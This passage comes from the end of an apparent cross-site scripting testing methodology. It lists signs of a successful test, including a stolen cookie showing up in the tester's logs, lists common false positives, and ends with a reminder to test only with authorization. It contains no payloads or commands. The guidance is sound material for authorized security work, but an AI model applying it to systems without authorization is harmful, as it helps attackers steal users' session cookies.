- Page content changes
- Cookie appears in your logs
- JavaScript error messages appear

**Common false positives:**
- Alert executes but parameter is URL encoded (won't execute in real browser)
- WAF block page appears
- Alert only works in your browser (self-XSS)
- Payload only works in developer console

---

*Remember: Always obtain proper authorization before testing. This methodology is for authorized security assessments and bug bounty programs only.*
